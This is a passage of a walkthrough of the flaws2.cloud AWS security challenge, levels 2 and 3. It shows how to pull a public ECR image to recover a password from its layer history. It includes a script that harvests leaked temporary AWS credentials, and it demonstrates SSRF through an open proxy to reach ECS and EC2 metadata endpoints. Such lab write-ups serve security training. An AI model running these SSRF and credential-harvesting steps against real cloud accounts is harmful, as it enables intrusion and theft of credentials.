<span class="c">#                 "LowerDir": "/var/lib/docker/overlay2/fc6a91db2d4e9928b7df0f74ce049d7a0318b8d3df12048067cacd660107babf/diff:/var/lib/docker/overlay2/1227f5684004759eeb508df0cc01170a20a0e4d1189f6d4eca5dd627ed5e73f4/diff:/var/lib/docker/overlay2/7758b82766621d50d099516d6d242fc2892cd4ece364501f513a748453cdb4fd/diff:/var/lib/docker/overlay2/8990a089d5838857b06357ebea16a0e27594cb53124cb9f9f38673c2f4c03ab2/diff:/var/lib/docker/overlay2/a977553c8a3ff13a444f69a8422dc6df967e8659ba1e4cb43ce90c25a37eec87/diff:/var/lib/docker/overlay2/449cb11583af58566ca399ad4322e1b428618edec8234a51d9060e94892664a7/diff:/var/lib/docker/overlay2/e596d0bb1784b3ce06c161a02b03afa161c5b035df3c4fb0a07cf3518273171d/diff:/var/lib/docker/overlay2/2e938647f50e15ebf4566306fdd99de281821b2a071ad91a032196f3bcdbfe16/diff:/var/lib/docker/overlay2/aea4d9fb324436155ca54672f24e822170c5360cefd32c56ad61db534695d458/diff",</span>
<span class="c">#                 "MergedDir": "/var/lib/docker/overlay2/a4fc2ea923e396aa3bbca3c39601f34063e59404b5b5f922cb4d7b1e09866522/merged",</span>
<span class="c">#                 "UpperDir": "/var/lib/docker/overlay2/a4fc2ea923e396aa3bbca3c39601f34063e59404b5b5f922cb4d7b1e09866522/diff",</span>
<span class="c">#                 "WorkDir": "/var/lib/docker/overlay2/a4fc2ea923e396aa3bbca3c39601f34063e59404b5b5f922cb4d7b1e09866522/work"</span>
<span class="c">#             },</span>
<span class="c">#             "Name": "overlay2"</span>
<span class="c">#         },</span>
<span class="c">#         "RootFS": {</span>
<span class="c">#             "Type": "layers",</span>
<span class="c">#             "Layers": [</span>
<span class="c">#                 "sha256:41c002c8a6fd36397892dc6dc36813aaa1be3298be4de93e4fe1f40b9c358d99",</span>
<span class="c">#                 "sha256:647265b9d8bc572a858ab25a300c07c0567c9124390fd91935430bf947ee5c2a",</span>
<span class="c">#                 "sha256:819a824caf709f224c414a56a2fa0240ea15797ee180e73abe4ad63d3806cae5",</span>
<span class="c">#                 "sha256:3db5746c911ad8c3398a6b72aa30580b25b6edb130a148beed4d405d9c345a29",</span>
<span class="c">#                 "sha256:1c1ac3ae43d53b452e0dfb320a5c22cf8ff5e8068a7ecef6779600d14ad4751b",</span>
<span class="c">#                 "sha256:bc16ef0350ee1577dfe09696bff225b40d241b26a359c146ffd5746a8ce18931",</span>
<span class="c">#                 "sha256:5db51ba604f0593199b4d8705a21fe6b1bc6cee503f7468539f6a80aa3cc4750",</span>
<span class="c">#                 "sha256:4e7b9bca030ac43814d0a6c6afed36f70fc2bb01a9dd84705358f424af1dae1e",</span>
<span class="c">#                 "sha256:5494da4989bbd817e20ead7cbaa8985d9907db95ea07b3e212e2e483de767f1d",</span>
<span class="c">#                 "sha256:67df634e1db11f3a6533ed051811c8290b69d7104550617dcc79303304cc78bb"</span>
<span class="c">#             ]</span>
<span class="c">#         },</span>
<span class="c">#         "Metadata": { "LastTagTime": "0001-01-01T00:00:00Z" }</span>
<span class="c">#     }</span>
<span class="c"># ]</span>


<span class="c"># view the commands used to create all the layers when the docker container was built:</span>
docker <span class="nb">history </span>2d73de35b781
<span class="c"># IMAGE               CREATED             CREATED BY                                      SIZE                COMMENT</span>
<span class="c"># 2d73de35b781        11 months ago       /bin/sh -c #(nop)  CMD ["sh" "/var/www/html/…   0B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  EXPOSE 80                    0B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop) ADD file:d29d68489f34ad718…   49B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop) ADD file:f8fd45be7a30bffa5…   614B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop) ADD file:fd3724e587d17e4bc…   1.89kB</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop) ADD file:b311a5fa51887368e…   999B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c htpasswd -b -c /etc/nginx/.htpass…   45B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c apt-get update     &amp;&amp; apt-get ins…   85.5MB</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop)  CMD ["/bin/bash"]            0B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c mkdir -p /run/systemd &amp;&amp; echo 'do…   7B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c rm -rf /var/lib/apt/lists/*          0B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c set -xe   &amp;&amp; echo '#!/bin/sh' &gt; /…   745B</span>
<span class="c"># &lt;missing&gt;           11 months ago       /bin/sh -c #(nop) ADD file:efec03b785a78c01a…   116MB</span>


<span class="c"># the command to set up the password for HTTP Basic Authentication</span>
<span class="c"># To get the full command</span>
docker <span class="nb">history </span>2d73de35b781 <span class="nt">--no-trunc</span>
<span class="c"># /bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password</span>
</pre></table></code></div></div><blockquote><p>Option 2: Using the AWS CLI</p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre>aws ecr batch-get-image <span class="se">\</span>
    <span class="nt">--repository-name</span> level2 <span class="se">\</span>
    <span class="nt">--registry-id</span> 653711331788 <span class="se">\</span>
    <span class="nt">--image-ids</span> <span class="nv">imageTag</span><span class="o">=</span>latest | jq <span class="s1">'.images[].imageManifest | fromjson'</span>

<span class="c"># see the multiple layers. We cold download any one of them based on its digest:</span>
<span class="c"># {</span>
<span class="c">#     "images": [</span>
<span class="c">#         {</span>
<span class="c">#             "registryId": "653711331788",</span>
<span class="c">#             "repositoryName": "level2",</span>
<span class="c">#             "imageId": {</span>
<span class="c">#                 "imageDigest": "sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e",</span>
<span class="c">#                 "imageTag": "latest"</span>
<span class="c">#             },</span>
<span class="c">#             "imageManifest": "{</span>
<span class="c">#                 "schemaVersion": 2,</span>
<span class="c">#                 "mediaType": "application/vnd.docker.distribution.manifest.v2+json",</span>
<span class="c">#                 "config": {</span>
<span class="c">#                     "mediaType": "application/vnd.docker.container.image.v1+json",</span>
<span class="c">#                     "size": 5359,</span>
<span class="c">#                     "digest": "sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"</span>
<span class="c">#                     },</span>
<span class="c">#                 "layers": [</span>
<span class="c">#                     {"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",</span>
<span class="c">#                     "size": 43412182,</span>
<span class="c">#                     "digest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"},</span>
<span class="c">#                     ...</span>
<span class="c">#                     {"mediaType": "application/vnd.docker.image.rootfs.diff.tar.gzip",</span>
<span class="c">#                     "size": 213,</span>
<span class="c">#                     "digest": "sha256:4fbdfdaee9ae20c6e877bd57838c6f93336573195f4aafcdec36fb4c4358a935"}]}",</span>
<span class="c">#                     "imageManifestMediaType": "application/vnd.docker.distribution.manifest.v2+json"</span>
<span class="c">#         }</span>
<span class="c">#     ],</span>
<span class="c">#     "failures": []</span>
<span class="c"># }</span>


<span class="c"># Then for a given digest, use:</span>
aws ecr get-download-url-for-layer <span class="se">\</span>
    <span class="nt">--repository-name</span> level2 <span class="se">\</span>
    <span class="nt">--registry-id</span> 653711331788 <span class="se">\</span>
    <span class="nt">--layer-digest</span> <span class="s2">"sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"</span> <span class="se">\</span>
    <span class="nt">--profile</span> flaws2 <span class="se">\</span>
    <span class="nt">--region</span> us-east-1
<span class="c"># {</span>
<span class="c">#     "downloadUrl": "https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/dc26-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/f1bebb74-3af2-4d58-8bbe-cfec79c8ceb3?X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIAsdQOhmH4M61p6nNFud8rIbH3RwQb3gZ%2B57EWiWy7HIAiAK0dkKIkWSXt7Ya4zul8lhtAj%2BM7mGJbvj6S3VOB2aZSrvAghvEAIaDDU5MTEwNTkxNDk1MiIMGlBfaYcxW5mJ0cdIKswC2wjblU4%2FgtiyOYTEsNfxhTopf4aQyWzYGYGUdm079DUhfDhTg14x4IuTj4N9mMsFYk7HdVb0iNIeNiTMqM0R%2FpM13XOOwOU7huxSwJdc9zIpFw0wXrO16vSFo0zpnxCktAusBNaFgg%2Bp6LW4IbfdE6N5SmHSV9HEFB5Ds7aMXVJsHtu%2FL5Q0jD9eKlNepJ6hdImoODDgiWbqbLi%2BF%2BSKomBHfgWbF5ZlV6%2BrU24F9sAcy%2FXy3%2BgqyUlXzuaVY0uKLKrDoFRei1uqn49sPS3uWyKfa18CxJW8%2BAyi1M48fd3PhKO8d8nY6IqIAINTddIf4rD9nMWwWzDJjQdDP32i25qoobiX9P%2Feg8UYR5PlHeddd5PmxH4MfJ4svozjlxt9AHw%2FK4YlC%2FfRi6qmSYO4%2Fqck7YWRA%2BwDm1IaeWJLYpH5RmYfHZjkyHslOucw4MbOgAY66AHOu3rmP4tZ38mhLyrDvENoEpjQ5r1OE%2BP5gpOc%2FnWU0X4tMldfSkS%2BnLLmSJdI2AObR97Kot%2BeYmEj6lbMDEHcuJZSuGIlSsFDgehXb%2FT8GOGmy6MNqXi4hxT%2FsWMcdr8%2Bte%2F05er97ygPHST1pgIgWa%2F2oirALPRXC1%2BKdSut4bFpffaOyzT4XKINUkg8ultpfKmAVyzAVP92LTkEY5Cz5QsagZRUqXUcCXBlgigGW30UCszp1NJHzK1hnskBP8fh9DMbUsIl70iM3THrCR5UXDEvF0GbqgYZ0l1bp1W0zA5ZUodA%2Fo1r&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20210129T061958Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=ASIAYTIFIPBEOQ76MFZB%2F20210129%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=953cc74b0fdbdb03046f3cafddb656527ff5114138c947efcf83a8f012531ef0",</span>
<span class="c">#     "layerDigest": "sha256:7b8b6451c85f072fd0d7961c97be3fe6e2f772657d471254f6d52ad9f158a580"</span>
<span class="c"># }</span>
wget <span class="s2">"https://prod-us-east-1-st...a599458"</span> <span class="nt">-O</span> layer.tar.gzip

<span class="c"># or just download the config file:</span>
wget <span class="s2">"https://prod-us-east-1-starport-layer-bucket.s3.us-east-1.amazonaws.com/dc26-653711331788-58b3a0a8-1806-5777-1315-c2d788e36c12/f1bebb74-3af2-4d58-8bbe-cfec79c8ceb3?X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJGMEQCIAsdQOhmH4M61p6nNFud8rIbH3RwQb3gZ%2B57EWiWy7HIAiAK0dkKIkWSXt7Ya4zul8lhtAj%2BM7mGJbvj6S3VOB2aZSrvAghvEAIaDDU5MTEwNTkxNDk1MiIMGlBfaYcxW5mJ0cdIKswC2wjblU4%2FgtiyOYTEsNfxhTopf4aQyWzYGYGUdm079DUhfDhTg14x4IuTj4N9mMsFYk7HdVb0iNIeNiTMqM0R%2FpM13XOOwOU7huxSwJdc9zIpFw0wXrO16vSFo0zpnxCktAusBNaFgg%2Bp6LW4IbfdE6N5SmHSV9HEFB5Ds7aMXVJsHtu%2FL5Q0jD9eKlNepJ6hdImoODDgiWbqbLi%2BF%2BSKomBHfgWbF5ZlV6%2BrU24F9sAcy%2FXy3%2BgqyUlXzuaVY0uKLKrDoFRei1uqn49sPS3uWyKfa18CxJW8%2BAyi1M48fd3PhKO8d8nY6IqIAINTddIf4rD9nMWwWzDJjQdDP32i25qoobiX9P%2Feg8UYR5PlHeddd5PmxH4MfJ4svozjlxt9AHw%2FK4YlC%2FfRi6qmSYO4%2Fqck7YWRA%2BwDm1IaeWJLYpH5RmYfHZjkyHslOucw4MbOgAY66AHOu3rmP4tZ38mhLyrDvENoEpjQ5r1OE%2BP5gpOc%2FnWU0X4tMldfSkS%2BnLLmSJdI2AObR97Kot%2BeYmEj6lbMDEHcuJZSuGIlSsFDgehXb%2FT8GOGmy6MNqXi4hxT%2FsWMcdr8%2Bte%2F05er97ygPHST1pgIgWa%2F2oirALPRXC1%2BKdSut4bFpffaOyzT4XKINUkg8ultpfKmAVyzAVP92LTkEY5Cz5QsagZRUqXUcCXBlgigGW30UCszp1NJHzK1hnskBP8fh9DMbUsIl70iM3THrCR5UXDEvF0GbqgYZ0l1bp1W0zA5ZUodA%2Fo1r&amp;X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Date=20210129T061958Z&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Expires=3600&amp;X-Amz-Credential=ASIAYTIFIPBEOQ76MFZB%2F20210129%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Signature=953cc74b0fdbdb03046f3cafddb656527ff5114138c947efcf83a8f012531ef0"</span> <span class="nt">-O</span> config

<span class="nb">cat </span>config | jq <span class="s1">'. | fromjson'</span>
<span class="c"># {</span>
<span class="c">#     "created": "2018-11-27T03:32:58.202361504Z",</span>
<span class="c">#     "created_by": "/bin/sh -c htpasswd -b -c /etc/nginx/.htpasswd flaws2 secret_password"</span>
<span class="c"># },</span>


<span class="c"># go to http://container.target.flaws2.cloud/</span>
<span class="c"># Read about Level 3 at level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</span>
</pre></table></code></div></div><h2 id="script-1">script</h2><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nv">INFILE</span><span class="o">=</span>~/.aws/credentials
<span class="nv">PROFILE</span><span class="o">=</span><span class="s1">'flaws2'</span>
<span class="nv">REPONAME</span><span class="o">=</span><span class="s1">'level2'</span>
<span class="nv">REGION</span><span class="o">=</span><span class="s1">'us-east-1'</span>

<span class="nv">RES</span><span class="o">=</span><span class="sb">`</span>curl <span class="nt">-s</span> <span class="s1">'https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=x'</span> | <span class="nb">tail</span> <span class="nt">-n1</span><span class="sb">`</span>
<span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$RES</span> | jq <span class="nt">-r</span> .AWS_ACCESS_KEY_ID<span class="sb">`</span>
<span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$RES</span> | jq <span class="nt">-r</span> .AWS_SECRET_ACCESS_KEY<span class="sb">`</span>
<span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$RES</span> | jq <span class="nt">-r</span> .AWS_SESSION_TOKEN<span class="sb">`</span>
<span class="nv">AWS_REGION</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$RES</span> | jq <span class="nt">-r</span> .AWS_REGION<span class="sb">`</span>

<span class="nb">echo</span> <span class="s2">"[</span><span class="nv">$PROFILE</span><span class="s2">]
REGION = </span><span class="nv">$AWS_REGION</span><span class="s2">
AWS_ACCESS_KEY_ID = </span><span class="nv">$AWS_ACCESS_KEY_ID</span><span class="s2">
AWS_SECRET_ACCESS_KEY = </span><span class="nv">$AWS_SECRET_ACCESS_KEY</span><span class="s2">
AWS_SESSION_TOKEN = </span><span class="nv">$AWS_SESSION_TOKEN</span><span class="s2">
"</span> | crudini <span class="nt">--merge</span> <span class="nv">$INFILE</span>
<span class="nb">echo</span> <span class="s2">"-------Set creds for profile </span><span class="nv">$PROFILE</span><span class="s2"> in </span><span class="nv">$INFILE</span><span class="s2">"</span>


<span class="nv">IDENTITY</span><span class="o">=</span><span class="sb">`</span>aws sts get-caller-identity <span class="se">\</span>
			<span class="nt">--profile</span> <span class="nv">$PROFILE</span><span class="sb">`</span>

<span class="nv">ACCOUNTID</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IDENTITY</span> | jq <span class="nt">-r</span> .Account<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"-------profile </span><span class="nv">$PROFILE</span><span class="s2"> 's account id is </span><span class="nv">$ACCOUNTID</span><span class="s2">"</span>



<span class="nv">IMAGE</span><span class="o">=</span><span class="sb">`</span>aws ecr list-images <span class="se">\</span>
	      <span class="nt">--repository-name</span> <span class="nv">$REPONAME</span> <span class="se">\</span>
	      <span class="nt">--registry-id</span> <span class="nv">$ACCOUNTID</span> <span class="se">\</span>
	      <span class="nt">--region</span> <span class="nv">$REGION</span> <span class="se">\</span>
	      <span class="nt">--profile</span> <span class="nv">$PROFILE</span><span class="sb">`</span>

<span class="nv">IMAGETAGINFO</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$IMAGE</span> | jq <span class="nt">-r</span> .imageIds[].imageTag<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"-------get the images tag </span><span class="nv">$IMAGETAGINFO</span><span class="s2">"</span>


<span class="nv">LAYERINFO</span><span class="o">=</span><span class="sb">`</span>aws ecr batch-get-image <span class="se">\</span>
		    <span class="nt">--repository-name</span> <span class="nv">$REPONAME</span> <span class="se">\</span>
		    <span class="nt">--registry-id</span> <span class="nv">$ACCOUNTID</span> <span class="se">\</span>
		    <span class="nt">--image-ids</span> <span class="nv">imageTag</span><span class="o">=</span><span class="nv">$IMAGETAGINFO</span> | jq <span class="s1">'.images[].imageManifest | fromjson'</span><span class="sb">`</span>

<span class="nv">LASTLAYERDIG</span><span class="o">=</span><span class="sb">`</span><span class="nb">echo</span> <span class="nv">$LAYERINFO</span> | jq <span class="nt">-r</span> <span class="s1">'.layers[0].digest'</span><span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"-------get the latest images's digest </span><span class="nv">$LASTLAYERDIG</span><span class="s2">"</span>


<span class="nv">LAYERURL</span><span class="o">=</span><span class="sb">`</span>aws ecr get-download-url-for-layer <span class="se">\</span>
			<span class="nt">--repository-name</span> <span class="nv">$REPONAME</span> <span class="se">\</span>
			<span class="nt">--registry-id</span> <span class="nv">$ACCOUNTID</span> <span class="se">\</span>
		    <span class="nt">--layer-digest</span> <span class="nv">$LASTLAYERDIG</span> <span class="se">\</span>
			<span class="nt">--region</span> <span class="nv">$REGION</span> <span class="se">\</span>
			<span class="nt">--profile</span> <span class="nv">$PROFILE</span> | jq <span class="nt">-r</span> .downloadUrl<span class="sb">`</span>
<span class="nb">echo</span> <span class="s2">"-------download the layer of </span><span class="nv">$LASTLAYERDIG</span><span class="s2">"</span>


wget <span class="nv">$LAYERURL</span> <span class="nt">-O</span> config
<span class="nb">echo</span> <span class="s2">"-------check the config file"</span>


<span class="nb">cat </span>config | jq
</pre></table></code></div></div><h2 id="lesson-learned-1">Lesson learned</h2><p>There are lots of other resources on AWS that can be public</p><ul><li>but they are harder to brute-force for because you have to include not only the name of the resource, but also the the Account ID and region.<li>They also can’t be searched with DNS records.<li>However, it is still best to avoid having public resources.</ul><hr /><h2 id="level-3---proxy-metadata-to-iam">Level 3 - proxy metadata to iam</h2><blockquote><p>level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</p></blockquote><font color="red"> The container's webserver you got access to includes a simple proxy that can be access with: - http://container.target.flaws2.cloud/proxy/http://flaws.cloud - or http://container.target.flaws2.cloud/proxy/http://neverssl.com </font><ol><li>proxy program is mentioned in the container image actually</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
</pre><td class="rouge-code"><pre>docker inspect 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2
<span class="c"># no ENTRYPOINT, and CMD = “sh /var/www/html/start.sh” .</span>

nginxroot@e247007162e8:/var/www/html# <span class="nb">cat </span>proxy.py
http://container.target.flaws2.cloud/proxy/file:////var/www/html/proxy.py
<span class="c"># import SocketServer</span>
<span class="c"># import SimpleHTTPServer</span>
<span class="c"># import urllib</span>
<span class="c"># import os</span>
<span class="c"># PORT = 8000</span>
<span class="c"># class Proxy(SimpleHTTPServer.SimpleHTTPRequestHandler):</span>
<span class="c">#   def do_GET(self):</span>
<span class="c">#     self.send_response(200)</span>
<span class="c">#     self.send_header("Content-type", "text/html")</span>
<span class="c">#     self.end_headers()</span>
<span class="c">#     # Remove starting slash</span>
<span class="c">#     self.path = self.path[1:]</span>
<span class="c">#     # Read the remote site</span>
<span class="c">#     response = urllib.urlopen(self.path)</span>
<span class="c">#     the_page = response.read(8192)</span>
<span class="c">#     # Return it</span>
<span class="c">#     self.wfile.write(bytes(the_page))</span>
<span class="c">#     self.wfile.close()</span>
<span class="c"># httpd = SocketServer.ForkingTCPServer(('', PORT), Proxy)</span>
<span class="c"># print "serving at port", PORT</span>
<span class="c"># httpd.serve_forever()</span>


nginxroot@e247007162e8:/var/www/html# <span class="nb">cat</span> /etc/nginx/sites-available/default
<span class="c"># server {</span>
<span class="c">#         listen 80 default_server;</span>
<span class="c">#         listen [::]:80 default_server;</span>
<span class="c">#         root /var/www/html;</span>
<span class="c">#         index index.html index.htm;</span>
<span class="c">#         merge_slashes off;</span>
<span class="c">#         server_name _;</span>
<span class="c">#         location / {</span>
<span class="c">#                 try_files $uri $uri/ =404;</span>
<span class="c">#                 auth_basic "Restricted Content";</span>
<span class="c">#                 auth_basic_user_file /etc/nginx/.htpasswd;</span>
<span class="c">#         }</span>
<span class="c">#         location /debug {</span>
<span class="c">#             #perl_set $debug 'sub { return %ENV; }';</span>
<span class="c">#             #return 200 '${debug}';</span>
<span class="c">#             return 200 'debug';</span>
<span class="c">#         }</span>
<span class="c">#         location  ~* ^/proxy/(.*)$ {</span>
<span class="c">#           limit_except GET {</span>
<span class="c">#             deny   all;</span>
<span class="c">#           }</span>
<span class="c">#           limit_req zone=one burst=1;</span>
<span class="c">#           set $proxyuri '$1';</span>
<span class="c">#           proxy_limit_rate 4096;</span>
<span class="c">#           proxy_set_header X-Real-IP $remote_addr;</span>
<span class="c">#           proxy_set_header Host      'localhost';</span>
<span class="c">#           resolver 8.8.8.8;</span>
<span class="c">#           proxy_pass http://127.0.0.1:8000/$proxyuri;</span>
<span class="c">#         }</span>
<span class="c"># }</span>


just like before, a proxy retrieving and returning any URL we desire.
This will <span class="nb">enable </span>us to commit SSRF and potentially pivot within this account.
</pre></table></code></div></div><ol><li>to query the ECS task’s Metadata:</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
</pre><td class="rouge-code"><pre>http://container.target.flaws2.cloud/proxy169.254.169.254/
http://container.target.flaws2.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials
http://container.target.flaws2.cloud/proxy/http://169.254.169.254/
<span class="c"># Empty response.</span>
<span class="c"># That IP is for EC2 instances, not ECS Tasks.</span>


<span class="c"># ECS Task Metadata Endpoints.</span>
http://container.target.flaws2.cloud/proxy/http://169.254.170.2/v2/metadata
<span class="o">{</span>
    <span class="s2">"Cluster"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:cluster/level3"</span>,
    <span class="s2">"TaskARN"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:task/2742123a-ed28-4a62-b08b-8cc33d932f26"</span>,
    <span class="s2">"Family"</span>:<span class="s2">"level3"</span>,
    <span class="s2">"Revision"</span>:<span class="s2">"3"</span>,
    <span class="s2">"DesiredStatus"</span>:<span class="s2">"RUNNING"</span>,
    <span class="s2">"KnownStatus"</span>:<span class="s2">"RUNNING"</span>,
    <span class="s2">"Containers"</span>:[
        <span class="o">{</span>
            <span class="s2">"DockerId"</span>:<span class="s2">"022f0bb003e003d3ef080d6151ff72214a3f46a7f693439ee2f7a1ae11eed956"</span>,
            <span class="s2">"Name"</span>:<span class="s2">"~internal~ecs~pause"</span>,
            <span class="s2">"DockerName"</span>:<span class="s2">"ecs-level3-3-internalecspause-eca0cefcdde9c18b5d00"</span>,
            <span class="s2">"Image"</span>:<span class="s2">"fg-proxy:tinyproxy"</span>,
            <span class="s2">"ImageID"</span>:<span class="s2">""</span>,
            <span class="s2">"Labels"</span>:<span class="o">{</span>
                <span class="s2">"com.amazonaws.ecs.cluster"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:cluster/level3"</span>,
                <span class="s2">"com.amazonaws.ecs.container-name"</span>:<span class="s2">"~internal~ecs~pause"</span>,
                <span class="s2">"com.amazonaws.ecs.task-arn"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:task/2742123a-ed28-4a62-b08b-8cc33d932f26"</span>,
                <span class="s2">"com.amazonaws.ecs.task-definition-family"</span>:<span class="s2">"level3"</span>,
                <span class="s2">"com.amazonaws.ecs.task-definition-version"</span>:<span class="s2">"3"</span>
                <span class="o">}</span>,
            <span class="s2">"DesiredStatus"</span>:<span class="s2">"RESOURCES_PROVISIONED"</span>,
            <span class="s2">"KnownStatus"</span>:<span class="s2">"RESOURCES_PROVISIONED"</span>,
            <span class="s2">"Limits"</span>:<span class="o">{</span><span class="s2">"CPU"</span>:0, <span class="s2">"Memory"</span>:0<span class="o">}</span>,
            <span class="s2">"CreatedAt"</span>:<span class="s2">"2020-10-15T03:00:38.261874402Z"</span>,
            <span class="s2">"StartedAt"</span>:<span class="s2">"2020-10-15T03:00:39.320526836Z"</span>,
            <span class="s2">"Type"</span>:<span class="s2">"CNI_PAUSE"</span>,
            <span class="s2">"Networks"</span>:[ <span class="o">{</span><span class="s2">"NetworkMode"</span>:<span class="s2">"awsvpc"</span>, <span class="s2">"IPv4Addresses"</span>:[<span class="s2">"172.31.60.122"</span><span class="o">]}]</span>
        <span class="o">}</span>,
        <span class="o">{</span>
            <span class="s2">"DockerId"</span>:<span class="s2">"4d1e5f7ba388ca5e9aa7143fc4279078ec1f039d604d1ef09c726397e166c49f"</span>,
            <span class="s2">"Name"</span>:<span class="s2">"level3"</span>,
            <span class="s2">"DockerName"</span>:<span class="s2">"ecs-level3-3-level3-ccb4b080ebe3bfe8c901"</span>,
            <span class="s2">"Image"</span>:<span class="s2">"653711331788.dkr.ecr.us-east-1.amazonaws.com/level2"</span>,
            <span class="s2">"ImageID"</span>:<span class="s2">"sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621"</span>,
            <span class="s2">"Labels"</span>:<span class="o">{</span>
                <span class="s2">"com.amazonaws.ecs.cluster"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:cluster/level3"</span>,
                <span class="s2">"com.amazonaws.ecs.container-name"</span>:<span class="s2">"level3"</span>,
                <span class="s2">"com.amazonaws.ecs.task-arn"</span>:<span class="s2">"arn:aws:ecs:us-east-1:653711331788:task/2742123a-ed28-4a62-b08b-8cc33d932f26"</span>,
                <span class="s2">"com.amazonaws.ecs.task-definition-family"</span>:<span class="s2">"level3"</span>,
                <span class="s2">"com.amazonaws.ecs.task-definition-version"</span>:<span class="s2">"3"</span>
            <span class="o">}</span>,
            <span class="s2">"DesiredStatus"</span>:<span class="s2">"RUNNING"</span>,
            <span class="s2">"KnownStatus"</span>:<span class="s2">"RUNNING"</span>,
            <span class="s2">"Limits"</span>:<span class="o">{</span><span class="s2">"CPU"</span>:0, <span class="s2">"Memory"</span>:0<span class="o">}</span>,
            <span class="s2">"CreatedAt"</span>:<span class="s2">"2020-10-15T03:00:46.424280771Z"</span>,
            <span class="s2">"StartedAt"</span>:<span class="s2">"2020-10-15T03:00:50.024889381Z"</span>,
            <span class="s2">"Type"</span>:<span class="s2">"NORMAL"</span>,
